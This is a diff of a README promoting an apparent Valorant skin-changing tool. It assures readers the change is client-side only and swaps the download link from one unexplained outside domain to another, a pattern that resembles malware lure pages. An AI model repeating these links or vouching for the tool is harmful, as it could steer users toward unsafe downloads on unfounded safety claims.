@@ -49,7 +49,7 @@ A: No — client-side only, server never sees changed skin ID.
 
 **Monthly downloads:** 2.4m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valskinchan)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valskinchan)
 
 ---
 
